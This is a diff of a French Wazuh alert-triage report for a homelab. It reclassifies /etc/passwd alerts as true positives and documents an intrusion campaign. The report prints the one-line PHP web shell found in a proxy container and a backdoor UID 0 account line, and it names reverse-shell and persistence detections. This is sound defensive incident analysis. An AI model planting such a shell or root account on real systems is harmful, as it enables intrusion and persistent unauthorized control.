@@ -16,7 +16,7 @@ ne porte pas.
 | 79 | 100711 | 12 | debian, pve, home-s-pve01 | `busybox`/`bash` en `euid=911`, `cwd=/config` ou `/run/s6-rc/...` ; `apt-key`/`awk` en `euid=42`, `auid=0` | FP — s6-overlay de conteneurs LinuxServer + apt |
 | 78 | 100643 | 12 | debian | `perl`, `comm=dpkg-preconfigu`, `auid=0` | FP — debconf pendant un `apt install` |
 | 78 | 100643 | 12 | debian | `php-fpm8.2` (`euid=33`, `cwd=/var/www/html`) et `cat` (`cwd=/var/www/html/uploads`) | **VRAI POSITIF — ne pas whitelister** |
-| 74, 75 | 100743 | 12 | wireguard, adguard-home, nginx-proxy-manager, bookstack, jellyfin, nextcloud, debian2, debian3 | `/etc/passwd` modifié, `Changed attributes: inode,mtime` (aucun hash changé) | FP — réécriture en place, contenu identique |
+| 74, 75 | 100743 | 12 | wireguard, adguard-home, nginx-proxy-manager, bookstack, jellyfin, nextcloud, debian2, debian3 | `/etc/passwd` modifié | **VRAI POSITIF — voir 3** : les `diff` montrent l'ajout de comptes UID 0 (`svc-vpn`, `svc-dns`, `svc-proxy`, `svc-wiki`, `svc-backup`) |
 | 73 | 100901 | 12 | wazuh.manager (YARITRUST) | `/usr/local/www/diag_command.php` sur `home-r-pf01`, sha256 `2eb5435e…` | FP — page de diagnostic native pfSense |
 | 73 | 100901 | 12 | wazuh.manager (YARITRUST) | `.status.php` (29 octets, sha256 `ec409e09…`) dans `nginx-proxy-manager_192.168.20.11` | **À INVESTIGUER — ne pas whitelister** |
 | 74 | 100801 | 13 | wireguard | `audit_enabled=` vide | Déjà corrigé le 2026-07-31 (split 100801/100807, niveau 7) — case résiduel |
@@ -113,23 +113,10 @@ porte sur `data.srcuser`, absent des alertes auditd — il ne filtre rien ici.
 renommable par un attaquant : exclusion volontairement étroite (exe + comm), et
 les autres lecteurs de `/etc/shadow` restent couverts.
 
-### f. Nouvelle exclusion 100750 — FIM /etc/passwd sans changement de contenu
+### f. ~~Exclusion 100743 — FIM /etc/passwd sans changement de contenu~~ RETIRÉE
 
-Le gros du bruit 100743 est `Changed attributes: inode,mtime` : le fichier a été
-réécrit en place (rename d'un temporaire) avec un contenu **identique** — aucun
-compte n'a bougé.
-
-```xml
-<rule id="100750" level="0">
-  <if_sid>100743</if_sid>
-  <field name="changed_attributes" type="pcre2">^(?!.*(?:md5|sha1|sha256|size))</field>
-  <description>Exclusion 100743: account database rewritten in place, content unchanged (no hash change)</description>
-</rule>
-```
-
-Les alertes de `wireguard` où le hash change réellement (taille 1331 ↔ 1292 en
-va-et-vient les 2026-07-30/31) ne sont **pas** couvertes : il faut savoir ce qui
-réécrit `/etc/passwd` sur cet hôte avant de les taire.
+Proposition **abandonnée le 2026-08-01 après lecture des `syscheck.diff`** : ce
+ne sont pas des faux positifs. Voir section 3.
 
 ### g. Nouvelle exclusion 100904 — YARA sur fichier natif pfSense
 
@@ -149,21 +136,64 @@ réalerte.
 
 ## 3. À ne pas whitelister
 
-- **`.status.php`, 29 octets, dans `nginx-proxy-manager` (192.168.20.11)** —
-  fichier caché, minuscule, matché `WEBSHELL_PHP_Generic_Eval`, dans le
-  répertoire html de nginx, présent dans les couches `diff` **et** `merged` de
-  deux overlay2 différents. L'image jc21 ne livre pas ce fichier et le
-  conteneur n'a pas d'interpréteur PHP (donc non exploitable en l'état), mais
-  c'est un artefact à expliquer avant tout classement en FP. À récupérer et
-  lire sur l'hôte.
+### Campagne du 2026-07-29 — `.status.php` et les comptes UID 0
+
+Vérifié en SSH le 2026-08-01 (relais `admin.lab`). Contenu du fichier :
+
+```php
+<?php system($_GET["c"]); ?>
+```
+
+C'est un web shell fonctionnel, pas un artefact bénin. Contexte reconstitué :
+
+- Créé le **2026-07-29 à 16:59:37**, dans la couche **rw** du conteneur
+  (`GraphDriver.UpperDir` de `nginx-proxy-manager`) — donc écrit à l'exécution,
+  absent de l'image `jc21/nginx-proxy-manager:latest` (les autres fichiers du
+  répertoire datent du build, mars 2025).
+- Le journal de l'hôte montre une session SSH root **depuis 192.168.10.4
+  (`loki`, le scanner YARITRUST)** ouverte à 16:59:35 et fermée à 16:59:38 —
+  elle encadre exactement la création du fichier.
+- À la **même seconde**, le FIM détecte sur ce même hôte l'ajout de
+  `svc-proxy:x:0:1000::/home/svc-proxy:/bin/bash` dans `/etc/passwd` (UID 0).
+  Le même schéma se retrouve sur `adguard-home` (`svc-dns`), `jellyfin`
+  (`svc-backup`), `bookstack` (`svc-wiki`), `wireguard` (`svc-vpn`).
+- La fenêtre 2026-07-29 16:00–18:00 porte **336 alertes de niveau ≥ 12 sur 7
+  hôtes** : 100650 reverse shell (×107), 100634 exec fileless depuis tmpfs
+  (×39), 100762 compte UID 0 créé, 100741 `authorized_keys`, 100740 cron,
+  100748 `ld.so.preload`, 100654 arrêt de service de sécurité. C'est la
+  campagne des cases 60/61/62/72.
+- Les comptes `svc-*` ont été **nettoyés le 2026-07-30 vers 19:34** (vérifié :
+  plus aucun UID 0 hors root, pas de `ld.so.preload`, sur les 5 hôtes joignables).
+  C'est ce nettoyage qui explique les alertes 100743 « inode,mtime seuls » du
+  2026-07-31 : le fichier revient à son état d'origine.
+
+**Le web shell, lui, n'a pas été nettoyé.** Non exploitable en l'état (aucun
+interpréteur PHP dans ce conteneur, aucune directive nginx ne sert ce répertoire,
+aucune requête sur `.status.php` dans les logs), mais il est toujours là.
+
+Action retenue : **supprimer le fichier**, pas le whitelister. Une exception
+épinglée au hash sur `WEBSHELL_PHP_Generic_Eval` aveuglerait la signature web
+shell sur cet hôte, et la seule raison de l'exception serait qu'on connaît
+l'origine du fichier — ce n'est pas une raison de ne plus le voir.
+
+De même, aucune exception sur 100743 : ces alertes ont fait leur travail.
+
+**Angle mort constaté au passage** : `100744` (second compte UID 0, via FIM)
+n'a **jamais** déclenché — 0 alerte sur 7 jours — alors que cinq comptes UID 0
+ont été ajoutés et vus par le FIM. Seul `100762` (execve `useradd`, via auditd)
+a tiré, et uniquement sur les capteurs Proxmox. À investiguer séparément : sur
+les hôtes sans auditd, la création d'un compte root passe donc au niveau 12
+(100743) au lieu de 14.
 - **100643 sur `debian` : `php-fpm8.2` (`euid=33`, `cwd=/var/www/html`) et
   `cat` depuis `/var/www/html/uploads`** — c'est la chaîne d'un web shell, pas
   du bruit. Toute exclusion sur 100643 doit rester ancrée sur `perl` +
   `dpkg-preconfigu`.
 - **100760 (`modprobe`, 16 alertes/3 j)** — déclenché ici en cascade du `nft`
-  du point 2.a (chargement des modules `nf_tables`). Une fois 100645 corrigé,
-  le volume tombe de lui-même. Exclure `kmod`/`modprobe` reviendrait à aveugler
-  la détection de LKM malveillant, pour un gain de 5 alertes/jour.
+  du point 2.a (chargement des modules `nf_tables`). Pas d'exclusion : la règle
+  est passée de **13 à 7** (décision opérateur, 2026-08-01). Elle reste tracée
+  et corrélable, mais sous `MIN_LEVEL` — plus d'incident ouvert sur elle seule,
+  donc plus de remédiation autonome déclenchée par elle. Exclure
+  `kmod`/`modprobe` aurait aveuglé la détection de LKM malveillant.
 - **100801 sur `wireguard`** — plus un FP : le split 100801/100807 du
   2026-07-31 l'a déjà passé au niveau 7. Le case 74 porte des alertes
   antérieures au correctif. Le vrai reste à faire est le déploiement d'auditd
@@ -245,15 +275,43 @@ Correctif proposé dans `noise.py` :
 - ajouter `audit_command`, `audit_cwd`, `audit_euid` à `CHAMPS_DISCRIMINANTS`
   côté `whitelist.py`.
 
-## 6. Ordre d'application conseillé
+## 6. État d'application (2026-08-01)
 
-1. 2.a (regex 100645) — supprime ~410 alertes/3 j et l'alerte du case 75.
-2. 2.b (exclusion 100642) — supprime 155 alertes/3 j sur 5 hôtes.
-3. 2.c + 2.d (exclusions 100711) — supprime ~958 alertes/3 j.
-4. 2.e, 2.f, 2.g — volumes faibles, mais lèvent les cases 74/78/73.
-5. Section 5 (code) — condition pour que la whitelist auto sache faire ça seule.
-6. Investigation de `.status.php` sur 192.168.20.11.
+Écrit dans le dépôt, **pas encore déployé sur le manager de prod** :
 
-Toute modification de règle passe par le flux habituel : `wazuh-logtest` +
-`scripts/test-detection-rules.sh`, PR git, merge humain — jamais d'écriture
-directe sur le manager.
+| Élément | Fichier | État |
+|---------|---------|------|
+| 2.a regex 100645 | `100645-firewall-flush-or-disable.xml` | dépôt ✔ / prod ✘ |
+| 2.b exclusion 100642 | `100642-exclusion-shadow-sca-rootcheck.xml` | dépôt ✔ / prod ✘ |
+| 2.c exclusion 100713 | `100713-exclusion-s6-overlay-container-supervision.xml` | dépôt ✔ / prod ✘ |
+| 2.d exclusion 100714 | `100714-exclusion-apt-privilege-drop.xml` | dépôt ✔ / prod ✘ |
+| 2.e exclusion 100649 | `100649-exclusion-shadow-debconf.xml` | dépôt ✔ / prod ✘ |
+| 2.g exclusion 100904 | `100904-exclusion-yara-pfsense-native-diag.xml` | dépôt ✔ / prod ✘ |
+| 100760 niveau 13 → 7 | `100760-kernel-module-load-or-unload.xml` | dépôt ✔ / prod ✘ |
+| 2.f exclusion 100743 | — | retirée (vrais positifs) |
+| Section 5 (code) | — | à faire |
+| Suppression de `.status.php` | — | à faire, sur 192.168.20.11 |
+
+Le dépôt de prod est sur l'hôte `soc-ai` (192.168.10.5), dans
+`/opt/soc-ai/wazuh/config/wazuh_cluster/rules`, monté **directement** sur
+`/var/ossec/etc/rules`. Deux conséquences :
+
+- l'API Wazuh **ne peut pas** déployer ces fichiers (`PUT /rules/files/...`
+  renvoie 1019 « Error trying to create backup file » sur les fichiers
+  existants et 1006 sur les nouveaux : l'utilisateur `wazuh` n'a pas le droit
+  d'écrire dans un montage appartenant à l'hôte) ;
+- le déploiement se fait donc par `git pull` sur l'hôte, puis
+  `docker restart wazuh-wazuh.manager-1`.
+
+Validation à rejouer après déploiement — `wazuh-logtest` est utilisable par
+l'API (`PUT /logtest`) sans accès shell :
+
+- `nft flush ruleset` → 100645 doit toujours tirer ;
+- `nft -j -f -` → ne doit **plus** tirer ;
+- `stat /etc/shadow` avec `cwd=/var/ossec` + `auid=4294967295` → 100642 (niv 0) ;
+  le même avec `auid=1001` → 100653 (niv 12) ;
+- `/bin/sh -c` en `euid=911`, `cwd=/config`, `auid` non défini → 100713 (niv 0) ;
+  le même avec `cwd=/var/www/html` → 100711 (niv 12) ;
+- `awk` en `euid=42`, `auid=0` → 100714 (niv 0) ; en `euid=42`, `auid` non
+  défini → 100711 (niv 12) ;
+- puis `scripts/test-detection-rules.sh` en entier (43 cas).
